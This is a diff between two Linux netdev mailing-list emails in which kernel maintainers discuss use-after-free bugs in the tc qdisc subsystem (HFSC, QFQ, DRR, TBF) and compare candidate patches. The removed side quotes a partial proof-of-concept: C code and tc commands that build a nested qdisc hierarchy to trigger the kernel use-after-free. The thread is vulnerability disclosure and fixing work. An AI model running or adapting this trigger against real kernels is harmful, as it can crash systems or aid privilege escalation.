@@ -1,325 +1,351 @@
-Return-Path: <netdev+bounces-202201-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-202202-lists+netdev=lfdr.de@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
 Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
-	by mail.lfdr.de (Postfix) with ESMTPS id 61D0FAECA60
-	for <lists+netdev@lfdr.de>; Sat, 28 Jun 2025 23:27:17 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id E5F42AECA69
+	for <lists+netdev@lfdr.de>; Sat, 28 Jun 2025 23:43:44 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 8FBF53BC071
-	for <lists+netdev@lfdr.de>; Sat, 28 Jun 2025 21:26:51 +0000 (UTC)
+	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 124E13B76AC
+	for <lists+netdev@lfdr.de>; Sat, 28 Jun 2025 21:43:19 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 236E426560D;
-	Sat, 28 Jun 2025 21:27:13 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 3C2DF2222A8;
+	Sat, 28 Jun 2025 21:43:41 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b="f1CaOY3l"
+	dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b="i2kFNNF2"
 X-Original-To: netdev@vger.kernel.org
-Received: from mail-pf1-f179.google.com (mail-pf1-f179.google.com [209.85.210.179])
+Received: from mail-pf1-f174.google.com (mail-pf1-f174.google.com [209.85.210.174])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6EA4C1D5154
-	for <netdev@vger.kernel.org>; Sat, 28 Jun 2025 21:27:11 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.179
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 347937DA66
+	for <netdev@vger.kernel.org>; Sat, 28 Jun 2025 21:43:36 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.174
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1751146033; cv=none; b=txZInwr+p2/xG7dazi2ijZ+Ytih5bqL1rur/R9nGS2pHt4QzuuwzgndNd7fKH4Rz7ynLWkLoRqJ6ZJGtYLXG3dCiDUSC/oekbGet8FdaqCV8LDy6NAz4p8carnM+FIJGkbHgpE2wWA8Rrcae0YynbxY2QSgpq7XEAQeCiiZZKZY=
+	t=1751147021; cv=none; b=OaGosRUZxxaHCt9MxuqikcmUC3vNVOPHa63jGeylBqU6gzdpPClgu+Xnvh5M3mXVDyTES03GFBIEiTPB/kYD58NAcHG0s93Y1EJlLLDAximgBLdvFgMza36KrJ+9iBWJ6qJxuOh9+eYL9AwmRRuwyqi4m2uTYhM3KS4UWm/0sYE=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1751146033; c=relaxed/simple;
-	bh=K/9woK+3OKPZ5PJQuqxlpUZo120MIGwhjZzob4Ko8LM=;
+	s=arc-20240116; t=1751147021; c=relaxed/simple;
+	bh=8qpfupX9YM+cPjJYUBH2kd5c0PcyqN/5Z8aODDgIleA=;
 	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=l4OLEnencULElRmM/nYZa2ymWi64URxHkfE4YvpvYKQEVLqM5TsTs55MByaQePPa0u0qWpUArWUOkZ3LGSuAamrhFS68mkhw+ENSLHZjEJpr8WqSUZH/UqnNJtGDuCNVPL7bLuRg2GR9oszc6w70hTHxnOGOxGNHshLapPT5xE0=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com; spf=none smtp.mailfrom=mojatatu.com; dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b=f1CaOY3l; arc=none smtp.client-ip=209.85.210.179
+	 To:Cc:Content-Type; b=B1H5I79f48+fIC0hSbXAYJsdsts8cN4VHKtFhJv9amgbB8aetCAvUl6AW0rSUFDzICFkp8EI8XCPl/cI7FUWK2+ClbnixLSdq9ji4zC+BYtDNT9F1GeA65IBr7pCeMiGa9H+IhqaHJ5uz4NXX7C+y9kPDmLmU80XLnM3eRJtYok=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com; spf=none smtp.mailfrom=mojatatu.com; dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b=i2kFNNF2; arc=none smtp.client-ip=209.85.210.174
 Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com
 Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=mojatatu.com
-Received: by mail-pf1-f179.google.com with SMTP id d2e1a72fcca58-74801bc6dc5so3357071b3a.1
-        for <netdev@vger.kernel.org>; Sat, 28 Jun 2025 14:27:11 -0700 (PDT)
+Received: by mail-pf1-f174.google.com with SMTP id d2e1a72fcca58-73972a54919so966069b3a.3
+        for <netdev@vger.kernel.org>; Sat, 28 Jun 2025 14:43:36 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=mojatatu-com.20230601.gappssmtp.com; s=20230601; t=1751146031; x=1751750831; darn=vger.kernel.org;
+        d=mojatatu-com.20230601.gappssmtp.com; s=20230601; t=1751147016; x=1751751816; darn=vger.kernel.org;
         h=content-transfer-encoding:cc:to:subject:message-id:date:from
          :in-reply-to:references:mime-version:from:to:cc:subject:date
          :message-id:reply-to;
-        bh=VRLlVts1Vo6GJ9j4jfNZitZx8cD9XywBMJ7P1rIiQlU=;
-        b=f1CaOY3lTM2s+OviWBX5Qw9kYLZshgPChY5mbbIu2T2C9Z+JuJJa4JCJLt4Dr3mVua
-         55kRuWmn2DMkkarCW/ZaLtXUCX6PXZaa22uyYBgy8jOnfDabtGjs5fQgcYL+i3yI7Z0R
-         mipLoKnEMA5WXEoaDXKU5s0+pCD7CQML7aiIKknLYbHW9VIIq1zwT2IheODC+bYmz44N
-         pR+3q5EVxpnxXzyLCFj//DTRr5ONF92cFjhwRs8TqNdzDyV4CfuKCezgvD/IPmEW5jJa
-         8SmShIEBqD7imlCGzo9aZfkJyc/gAArp9jR7b3+vG/SAXGIkfyD2fbnqocRF2GPUaB27
-         zPVQ==
+        bh=MU6rUaXd/jwIT7Zn2GEQQNo0DhvukKg2e5GHoI2EbLc=;
+        b=i2kFNNF2XfvvmFqXnfPLS/gi/HlifkML3+zohWJVgxwQStz9PB2Qq3ofiac/Sq7wsU
+         I8dfvPpByNH3u+IZKfTN5MLHRU0Qoq3lKyzVe/79cgWYtGGWO394Yp2kYz5Xff9RgxOX
+         RFxt4vqu95xlrwrHk+FBrRLYGgYMeUpbPZIwyf3ls1miGJ21tQATnMJHvt28Vp5czg0b
+         jRJuVgxb79mTnG2PPqYafgr0LuqBmHSd4YQGBs81n2bo5HC/ZcXcxFYTjM6qfEZh/0oz
+         Oe40/fpx/oOmjikeQpcRkatItuv6vS749eM7Ohb+YzwMuWd1WxKgJg3dv23mQ8RyF+vb
+         ITMg==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1751146031; x=1751750831;
+        d=1e100.net; s=20230601; t=1751147016; x=1751751816;
         h=content-transfer-encoding:cc:to:subject:message-id:date:from
          :in-reply-to:references:mime-version:x-gm-message-state:from:to:cc
          :subject:date:message-id:reply-to;
-        bh=VRLlVts1Vo6GJ9j4jfNZitZx8cD9XywBMJ7P1rIiQlU=;
-        b=JWZ92gR441iAMECJWx7vCWnKUPIUiTYYMBckmwTZRbycEiPlpdmgzE2p5FZAKii1xJ
-         D94JLTAEWUNezITKZJ5dZlAANGKE0tuzdI3QDfx6jnp/ilENfhQ2E1yKgXmX9lh/8sJ4
-         AyWmB2HggB1J7o2lp/y25ikBzDBaqkezPMZtri2GwDilZJPcg5spLehouG6TsK2VwTlH
-         Q/Q7w51sCur+t8Atua7mObuyhuEKKkN8AD734y4W30TyocvkJUoCyGUCZnqt1qIY1cyr
-         G0X0IIxZ83rXCXW+0Hm+GPvW7CNre/xfx0mjBMRWa7wtz1Ap7ffaoi9/jKmjNxwDDVwt
-         j1BA==
-X-Forwarded-Encrypted: i=1; AJvYcCW7IXc+1KtDMZgjiYWKUqjv5P8hLv7UNIAgQkkhMKixaAnnSbm5Cp/HnweFimF1bc5bNgVdo1Y=@vger.kernel.org
-X-Gm-Message-State: AOJu0YyY0RpiCpm9bFt7lX9F1XRL/ECVqh15SIMzqo9wDZhq9PqAUIFV
-	BBzLjtQbrQHD0nTGtt8Uz5im50Mag/QM28NHRSKr3vtdyz1xCTIGx3jf/I5tJOAd46A464JzIrj
-	lnMrTmqLqEqInn+LfNY/SXRG2he27IC+HK8UXRwx4iLqal8nvKk7eRA==
-X-Gm-Gg: ASbGncuct4zQxFZoPvndaJGwW6PtQZOztBf+Ho/QpwaKDS+4+gOrgSBUWxjIiOmu56J
-	KtQfruOz/BIQyKL5wLnr6YB0dDcbPcp7OOKqwBuQ8Rh+ix4JtpCbJuNAle/WiVuPuoB/UjWofRr
-	H2aKe+aTORAmYRE+FLXJJVOSs3ttr9fUQgTgFXTDN2kA==
-X-Google-Smtp-Source: AGHT+IFOTjXZ6Bmw82mBiul5HkvYQwk60Te4+lljpdW+4etQrPZtIb3mM72WBrb0lcBigqxeOtnW+m3F5qgkCvA+O8w=
-X-Received: by 2002:a05:6a00:944c:b0:748:e289:6bc with SMTP id
- d2e1a72fcca58-74af78a2523mr9537778b3a.1.1751146030636; Sat, 28 Jun 2025
- 14:27:10 -0700 (PDT)
+        bh=MU6rUaXd/jwIT7Zn2GEQQNo0DhvukKg2e5GHoI2EbLc=;
+        b=uVfM9UZ968qX8bnMwQV+ebld7hA+DbX42mLeFgS77a9N/aVquqArY1UgcsUeda9bWu
+         gJ+1CJB/biyOlU29oD4/oS8pv11DYgK1g7jLi+4dL+EzYdYPBzpfzapAEl5CGXZIyOPg
+         bSYBHwPByWV4DafDiLCXOW5rmpZ/JAG9TR1OV7Lq6gSCU+HQULK4vAPdB22IfZMgSup2
+         LTy2DE3kXckB6ttgftjW/OM1my8FjikS9JTez61dw1b9qlvdRIx+Ft1i/oMqRMaWZrfe
+         atvyqLd3AXqX0r3aB/2ez+eM2ZDuT1Zg7Gkz0N9XCFrvQcFQagh9f7M+lV/vPlqcXr+W
+         KL2g==
+X-Forwarded-Encrypted: i=1; AJvYcCVi+lZ9vF1kVZWeEo2D1LbdNVn8wplYiWyrL/8rxoUQu+1xE5OH0ZvcbscYbWkHfpwiwPVk4fY=@vger.kernel.org
+X-Gm-Message-State: AOJu0Yx+rqacR/2kbhay0q+NOKeY6H030SdLKMi9UrzQDJFLRdRkVi3N
+	H4oYSR6kvcouLCDZkIDDTukIpJJeuPjIDNbK1k8Sj17aP02sw87fDwCWcY74jslI7Kq/mnhXszo
+	BD9nNvkCkyUimb9Gma0HHLuhWzn7A35jkteXoE143drXPti9+TY7yrg==
+X-Gm-Gg: ASbGncth7pc+gkYyz5xBKkHSDvzqG7dCi6+lvnMQ3BdKmVDHejmLJ16kHrh7UahxT7J
+	qeBDm7z6ASj8ftEeMicRtRj63FT0P2q/E2a9a+Gx0D6NmRTJEsWx9cl8yGgRkwm0xIAKhyf1SWk
+	HAXsNXe/YQSQuL+Zo6LQA92tTrvzdOfu56kt9oyVNu3w==
+X-Google-Smtp-Source: AGHT+IGZg4IXlxL3x10Kvx/31X16LC0IBK3hyvWl1q3uyu38lUVpfO1zW6/k8WY4u0FaRG1Zos9RGuga160MtQC5pJ4=
+X-Received: by 2002:a05:6a20:2449:b0:1f5:95a7:8159 with SMTP id
+ adf61e73a8af0-220a12d3834mr12486991637.10.1751147015798; Sat, 28 Jun 2025
+ 14:43:35 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <CAE1YQVoTz5REkvZWzq_X5f31Sr6NzutVCxxmLfWtmVZkjiingA@mail.gmail.com>
- <CAM_iQpV8NpK_L2_697NccDPfb9SPYhQ7BT1Ssueh7nT-rRKJRA@mail.gmail.com>
- <CAM_iQpXVaxTVALH9_Lki+O=1cMaVx4uQhcRvi4VcS2rEdYkj5Q@mail.gmail.com>
- <CAM_iQpVi0V7DNQFiNWWMr+crM-1EFbnvWV5_L-aOkFsKaA3JBQ@mail.gmail.com>
- <CAM0EoMm4D+q1eLzfKw3gKbQF43GzpBcDFY3w2k2OmtohJn=aJw@mail.gmail.com>
- <CAM0EoMkFzD0gKfJM2-Dtgv6qQ8mjGRFmWF7+oe=qGgBEkVSimg@mail.gmail.com> <CAE1YQVq=FmrGw56keHQ2gEGtrdg3H5Nf_OcPb8_Rn5NVQ4AoHg@mail.gmail.com>
-In-Reply-To: <CAE1YQVq=FmrGw56keHQ2gEGtrdg3H5Nf_OcPb8_Rn5NVQ4AoHg@mail.gmail.com>
+References: <45876f14-cf28-4177-8ead-bb769fd9e57a@gmail.com>
+ <aFosjBOUlOr0TKsd@pop-os.localdomain> <3af4930b-6773-4159-8a7a-e4f6f6ae8109@gmail.com>
+ <5e4490da-3f6c-4331-af9c-0e6d32b6fc75@gmail.com> <CAM0EoMm+xgb0vkTDMAWy9xCvTF+XjGQ1xO5A2REajmBN1DKu1Q@mail.gmail.com>
+ <d23fe619-240a-4790-9edd-bec7ab22a974@gmail.com>
+In-Reply-To: <d23fe619-240a-4790-9edd-bec7ab22a974@gmail.com>
 From: Jamal Hadi Salim <jhs@mojatatu.com>
-Date: Sat, 28 Jun 2025 17:26:59 -0400
-X-Gm-Features: Ac12FXzkvBOUitOXLbxnnBrhI_88xH3aJRADIACWUT0a2g92a3PxgqDUEqS3CE8
-Message-ID: <CAM0EoMnv6YAUJVEFx2mGrP75G8wzRiN+Z=hSfRAz8ia0Fe4vBw@mail.gmail.com>
-Subject: Re: Use-after-free in Linux tc subsystem (v6.15)
-To: Mingi Cho <mgcho.minic@gmail.com>
-Cc: Cong Wang <xiyou.wangcong@gmail.com>, security@kernel.org, 
-	Jiri Pirko <jiri@resnulli.us>, Linux Kernel Network Developers <netdev@vger.kernel.org>
+Date: Sat, 28 Jun 2025 17:43:24 -0400
+X-Gm-Features: Ac12FXw6fj0AJ6Skf1_AaURBAmblgPpYqxtIRjRAgmxwJWtNAKxP_R1eZAQ6tuQ
+Message-ID: <CAM0EoM=rU91P=9QhffXShvk-gnUwbRHQrwpFKUr9FZFXbbW1gQ@mail.gmail.com>
+Subject: Re: Incomplete fix for recent bug in tc / hfsc
+To: Lion Ackermann <nnamrec@gmail.com>
+Cc: Cong Wang <xiyou.wangcong@gmail.com>, netdev@vger.kernel.org, 
+	Jiri Pirko <jiri@resnulli.us>, Mingi Cho <mincho@theori.io>
 Content-Type: text/plain; charset="UTF-8"
 Content-Transfer-Encoding: quoted-printable
 
-On Thu, Jun 26, 2025 at 1:11=E2=80=AFAM Mingi Cho <mgcho.minic@gmail.com> w=
-rote:
+On Thu, Jun 26, 2025 at 4:08=E2=80=AFAM Lion Ackermann <nnamrec@gmail.com> =
+wrote:
 >
-> On Fri, Jun 20, 2025 at 8:24=E2=80=AFPM Jamal Hadi Salim <jhs@mojatatu.co=
-m> wrote:
+> Hi,
+>
+> On 6/25/25 4:22 PM, Jamal Hadi Salim wrote:
+> > On Tue, Jun 24, 2025 at 6:43=E2=80=AFAM Lion Ackermann <nnamrec@gmail.c=
+om> wrote:
+> >>
+> >> Hi,
+> >>
+> >> On 6/24/25 11:24 AM, Lion Ackermann wrote:
+> >>> Hi,
+> >>>
+> >>> On 6/24/25 6:41 AM, Cong Wang wrote:
+> >>>> On Mon, Jun 23, 2025 at 12:41:08PM +0200, Lion Ackermann wrote:
+> >>>>> Hello,
+> >>>>>
+> >>>>> I noticed the fix for a recent bug in sch_hfsc in the tc subsystem =
+is
+> >>>>> incomplete:
+> >>>>>     sch_hfsc: Fix qlen accounting bug when using peek in hfsc_enque=
+ue()
+> >>>>>     https://lore.kernel.org/all/20250518222038.58538-2-xiyou.wangco=
+ng@gmail.com/
+> >>>>>
+> >>>>> This patch also included a test which landed:
+> >>>>>     selftests/tc-testing: Add an HFSC qlen accounting test
+> >>>>>
+> >>>>> Basically running the included test case on a sanitizer kernel or w=
+ith
+> >>>>> slub_debug=3DP will directly reveal the UAF:
+> >>>>
+> >>>> Interesting, I have SLUB debugging enabled in my kernel config too:
+> >>>>
+> >>>> CONFIG_SLUB_DEBUG=3Dy
+> >>>> CONFIG_SLUB_DEBUG_ON=3Dy
+> >>>> CONFIG_SLUB_RCU_DEBUG=3Dy
+> >>>>
+> >>>> But I didn't catch this bug.
+> >>>>
+> >>>
+> >>> Technically the class deletion step which triggered the sanitizer was=
+ not
+> >>> present in your testcase. The testcase only left the stale pointer wh=
+ich was
+> >>> never accessed though.
+> >>>
+> >>>>> To be completely honest I do not quite understand the rationale beh=
+ind the
+> >>>>> original patch. The problem is that the backlog corruption propagat=
+es to
+> >>>>> the parent _before_ parent is even expecting any backlog updates.
+> >>>>> Looking at f.e. DRR: Child is only made active _after_ the enqueue =
+completes.
+> >>>>> Because HFSC is messing with the backlog before the enqueue complet=
+ed,
+> >>>>> DRR will simply make the class active even though it should have al=
+ready
+> >>>>> removed the class from the active list due to qdisc_tree_backlog_fl=
+ush.
+> >>>>> This leaves the stale class in the active list and causes the UAF.
+> >>>>>
+> >>>>> Looking at other qdiscs the way DRR handles child enqueues seems to=
+ resemble
+> >>>>> the common case. HFSC calling dequeue in the enqueue handler violat=
+es
+> >>>>> expectations. In order to fix this either HFSC has to stop using de=
+queue or
+> >>>>> all classful qdiscs have to be updated to catch this corner case wh=
+ere
+> >>>>> child qlen was zero even though the enqueue succeeded. Alternativel=
+y HFSC
+> >>>>> could signal enqueue failure if it sees child dequeue dropping pack=
+ets to
+> >>>>> zero? I am not sure how this all plays out with the re-entrant case=
+ of
+> >>>>> netem though.
+> >>>>
+> >>>> I think this may be the same bug report from Mingi in the security
+> >>>> mailing list. I will take a deep look after I go back from Open Sour=
+ce
+> >>>> Summit this week. (But you are still very welcome to work on it by
+> >>>> yourself, just let me know.)
+> >>>>
+> >>>> Thanks!
+> >>>
+> >>>> My suggestion is we go back to a proposal i made a few moons back (w=
+as
+> >>>> this in a discussion with you? i dont remember): create a mechanism =
+to
+> >>>> disallow certain hierarchies of qdiscs based on certain attributes,
+> >>>> example in this case disallow hfsc from being the ancestor of "qdisc=
+s that may
+> >>>> drop during peek" (such as netem). Then we can just keep adding more
+> >>>> "disallowed configs" that will be rejected via netlink. Similar idea
+> >>>> is being added to netem to disallow double duplication, see:
+> >>>> https://lore.kernel.org/netdev/20250622190344.446090-1-will@willsroo=
+t.io/
+> >>>>
+> >>>> cheers,
+> >>>> jamal
+> >>>
+> >>> I vaguely remember Jamal's proposal from a while back, and I believe =
+there was
+> >>> some example code for this approach already?
+> >>> Since there is another report you have a better overview, so it is pr=
+obably
+> >>> best you look at it first. In the meantime I can think about the solu=
+tion a
+> >>> bit more and possibly draft something if you wish.
+> >>>
+> >>> Thanks,
+> >>> Lion
+> >>
+> >> Actually I was intrigued, what do you think about addressing the root =
+of the
+> >> use-after-free only and ignore the backlog corruption (kind of). After=
+ the
+> >> recent patches where qlen_notify may get called multiple times, we cou=
+ld simply
+> >> loosen qdisc_tree_reduce_backlog to always notify when the qdisc is em=
+pty.
+> >> Since deletion of all qdiscs will run qdisc_reset / qdisc_purge_queue =
+at one
+> >> point or another, this should always catch left-overs. And we need not=
+ care
+> >> about all the complexities involved of keeping the backlog right and /=
+ or
+> >> prevent certain hierarchies which seems rather tedious.
+> >> This requires some more testing, but I was imagining something like th=
+is:
+> >>
+> >> diff --git a/net/sched/sch_api.c b/net/sched/sch_api.c
+> >> --- a/net/sched/sch_api.c
+> >> +++ b/net/sched/sch_api.c
+> >> @@ -780,15 +780,12 @@ static u32 qdisc_alloc_handle(struct net_device =
+*dev)
+> >>
+> >>  void qdisc_tree_reduce_backlog(struct Qdisc *sch, int n, int len)
+> >>  {
+> >> -       bool qdisc_is_offloaded =3D sch->flags & TCQ_F_OFFLOADED;
+> >>         const struct Qdisc_class_ops *cops;
+> >>         unsigned long cl;
+> >>         u32 parentid;
+> >>         bool notify;
+> >>         int drops;
+> >>
+> >> -       if (n =3D=3D 0 && len =3D=3D 0)
+> >> -               return;
+> >>         drops =3D max_t(int, n, 0);
+> >>         rcu_read_lock();
+> >>         while ((parentid =3D sch->parent)) {
+> >> @@ -797,17 +794,8 @@ void qdisc_tree_reduce_backlog(struct Qdisc *sch,=
+ int n, int len)
+> >>
+> >>                 if (sch->flags & TCQ_F_NOPARENT)
+> >>                         break;
+> >> -               /* Notify parent qdisc only if child qdisc becomes emp=
+ty.
+> >> -                *
+> >> -                * If child was empty even before update then backlog
+> >> -                * counter is screwed and we skip notification because
+> >> -                * parent class is already passive.
+> >> -                *
+> >> -                * If the original child was offloaded then it is allo=
+wed
+> >> -                * to be seem as empty, so the parent is notified anyw=
+ay.
+> >> -                */
+> >> -               notify =3D !sch->q.qlen && !WARN_ON_ONCE(!n &&
+> >> -                                                      !qdisc_is_offlo=
+aded);
+> >> +               /* Notify parent qdisc only if child qdisc becomes emp=
+ty. */
+> >> +               notify =3D !sch->q.qlen;
+> >>                 /* TODO: perform the search on a per txq basis */
+> >>                 sch =3D qdisc_lookup(qdisc_dev(sch), TC_H_MAJ(parentid=
+));
+> >>                 if (sch =3D=3D NULL) {
+> >> @@ -816,6 +804,9 @@ void qdisc_tree_reduce_backlog(struct Qdisc *sch, =
+int n, int len)
+> >>                 }
+> >>                 cops =3D sch->ops->cl_ops;
+> >>                 if (notify && cops->qlen_notify) {
+> >> +                       /* Note that qlen_notify must be idempotent as=
+ it may get called
+> >> +                        * multiple times.
+> >> +                        */
+> >>                         cl =3D cops->find(sch, parentid);
+> >>                         cops->qlen_notify(sch, cl);
+> >>                 }
+> >>
 > >
-> > On Wed, Jun 18, 2025 at 4:17=E2=80=AFPM Jamal Hadi Salim <jhs@mojatatu.=
-com> wrote:
-> > >
-> > > On Mon, Jun 16, 2025 at 9:03=E2=80=AFPM Cong Wang <xiyou.wangcong@gma=
-il.com> wrote:
-> > > >
-> > > > On Sun, Jun 15, 2025 at 10:02=E2=80=AFPM Cong Wang <xiyou.wangcong@=
-gmail.com> wrote:
-> > > > >
-> > > > > On Thu, Jun 12, 2025 at 2:18=E2=80=AFPM Cong Wang <xiyou.wangcong=
-@gmail.com> wrote:
-> > > > > >
-> > > > > > Hi Mingi,
-> > > > > >
-> > > > > > Thanks for your report!
-> > > > > >
-> > > > > > I won't have time to look into this until this Sunday, if you o=
-r
-> > > > > > anyone else have
-> > > > > > time before that, please feel free to work on a patch. Otherwis=
-e, I will take a
-> > > > > > look this Sunday.
-> > > > >
-> > > > > I am testing the attached patch, I will take a deeper look tomorr=
-ow.
-> > > >
-> > > > It is more complicated than I thought. I think we need to rollback =
-all
-> > > > the previous enqueue operations, but it does not look pretty either=
-.
-> > > >
-> > > > Jamal, do you like the attached fix? I don't have any better ideas
-> > > > so far. :-/
-> > > >
-> > >
-> > > I just got back - let me look at it tomorrow. Immediate reaction is i
-> > > would suspect netem
-> >
-> > Spent time yesterday and there are two potential approaches
-> > (attached), both of which fix the issue but i am not satisfied with
-> > either.
-> >
-> > The root cause being exploited here is there are some qdisc's whose
-> > peek() drops packets - but given peek() doesnt return a code, the
-> > parent is unaware of what happened.
-> >
-> > drr_fix.diff
-> > avoids making a class active  by detecting whether drr_qlen_notify was
-> > called between after enqueue (even though that enqueue succeeded), in
-> > that case, returns a NET_XMIT_SUCCESS | __NET_XMIT_BYPASS which ensure
-> > we don't add the class to drr.
-> >
-> > This fixes the UAF but it would require an analogous fix for other
-> > qdiscs with similar behavior (ets, hfsc, ...)
-> >
-> > qfq_netem_child_fix.diff
-> > piggy backs on your tbf patch and detects whether
-> > qdisc_tree_reduce_backlog was called after qfq's peeked its child
-> > (netem in this repro) in enqueue.
-> > This would also require fixing other qdiscs.
-> >
-> > TBH, while both approaches fix the UAF, IMO they are short term hacks
-> > and i am sure Mingi and co will find yet another way to send netlink
-> > messages to config a _nonsensical hierarchy of qdiscs_ (as was this
-> > one!) to create yet another UAF.
-> >
-> > My suggestion is we go back to a proposal i made a few moons back:
-> > create a mechanism to disallow certain hierarchies of qdiscs, ex in
-> > this case disallow qfq from being the ancestor of "qdiscs that may
-> > drop during peek" (such as netem). Then we can just keep adding more
-> > "disallowed configs" that will be rejected via netlink.
-> > And TBH, i feel like obsoleting qfq altogether - the author doesnt
-> > even respond to emails.
+> > I believe this will fix the issue. My concern is we are not solving
+> > the root cause. I also posted a bunch of fixes on related issues for
+> > something Mingi Cho (on Cc) found - see attachments, i am not in favor
+> > of these either.
+> > Most of these setups are nonsensical. After seeing so many of these my
+> > view is we start disallowing such hierarchies.
 > >
 > > cheers,
 > > jamal
 >
-> Hello,
+> I would also disagree with the attached patches for various reasons:
+> - The QFQ patch relies on packet size backlog, which is not to be
+>   trusted because of several sources that may make this unreliable
+>   (netem, size tables, GSO, etc.)
+> - In the TBF variant the ret may get overwritten during the loop,
+>   so it only relies on the final packet status. I would not trust
+>   this always working either.
+> - DRR fix seems fine, but it still requires all other qdiscs to
+>   be correct (and something similar needs to be applied to all
+>   classfull qdiscs?)
+> - The changes to qdisc_tree_reduce_backlog do not really make sense
+>   to me I must be missing something here..
 >
-> I think the testcase I reported earlier actually contains two
-> different bugs. The first is returning SUCCESS with an empty TBF qdisc
-> in tbf_segment, and the second is returning SUCCESS with an empty QFQ
-> qdisc in qfq_enqueue.
+> What do you think the root cause is here? AFAIK what all the issues
+> have in common is that eventually qlen_notify is _not_ called,
+> thus leaving stale class pointers. Naturally the consequence
+> could be to simply always call qlen_notify on class deletion and
+> make classfull qdiscs aware that it may get called on inactive
+> classes. And this is what I tried with my proposal.
+> This does not solve the backlog issues though. But the pressing
+> issue seems to be the uaf and not the statistic counters?
+>
+> My concern with preventing certain hierarchies is that we would
+> hide the backlog issues and we would be chasing bad hierarchies.
+> Still it would also solve all the problems eventually I guess.
 >
 
-Please join the list where a more general solution is being discussed here:
-https://lore.kernel.org/netdev/aF847kk6H+kr5kIV@pop-os.localdomain/
+On "What do you think the root cause is here?"
+
+I believe the root cause is that qdiscs like hfsc and qfq are dropping
+all packets in enqueue (mostly in relation to peek()) and that result
+is not being reflected in the return code returned to its parent
+qdisc.
+So, in the example you described in this thread, drr is oblivious to
+the fact that the child qdisc dropped its packet because the call to
+its child enqueue returned NET_XMIT_SUCCESS. This causes drr to
+activate a class that shouldn't have been activated at all.
+
+You can argue that drr (and other similar qdiscs) may detect this by
+checking the call to qlen_notify (as the drr patch was
+doing), but that seems really counter-intuitive. Imagine writing a new
+qdisc and having to check for that every time you call a child's
+enqueue. Sure  your patch solves this, but it also seems like it's not
+fixing the underlying issue (which is drr activating the class in the
+first place). Your patch is simply removing all the classes from their
+active lists when you delete them. And your patch may seem ok for now,
+but I am worried it might break something else in the future that we
+are not seeing.
+
+And do note: All of the examples of the hierarchy I have seen so far,
+that put us in this situation, are nonsensical
 
 cheers,
 jamal
-> The first bug is present in TBF qdisc, so the UAF is also triggered
-> when using a qdisc other than QFQ. Below is a POC that shows how the
-> TBF qdisc can be made empty by using a CHOKE qdisc instead of a QFQ.
->
-> #define _GNU_SOURCE
->
-> #include <arpa/inet.h>
-> #include <fcntl.h>
-> #include <stdlib.h>
-> #include <unistd.h>
-> #include <linux/udp.h>
->
-> #ifndef SOL_UDP
-> #define SOL_UDP 17 // UDP protocol value for setsockopt
-> #endif
->
-> void loopback_send (uint64_t size) {
->     struct sockaddr iaddr =3D { AF_INET };
->     char data[0x1000] =3D {0,};
->
->     int inet_sock_fd =3D socket(PF_INET, SOCK_DGRAM, 0);
->
->     int gso_size =3D 1300;
->
->     setsockopt(inet_sock_fd, SOL_UDP, UDP_SEGMENT, &gso_size, sizeof(gso_=
-size));
->
->     connect(inet_sock_fd, &iaddr, sizeof(iaddr));
->
->     write(inet_sock_fd, data, size);
->
->     close(inet_sock_fd);
-> }
->
-> int main(int argc, char **argv) {
->     system("ip link set dev lo up");
->     system("ip link set dev lo mtu 1500");
->
->     system("tc qdisc add dev lo root handle 1: drr");
->     system("tc filter add dev lo parent 1: basic classid 1:1");
->     system("tc class add dev lo parent 1: classid 1:1 drr");
->     system("tc class add dev lo parent 1: classid 1:2 drr");
->
->     system("tc qdisc add dev lo parent 1:1 handle 2: tbf rate 1Mbit
-> burst 1514 latency 50ms");
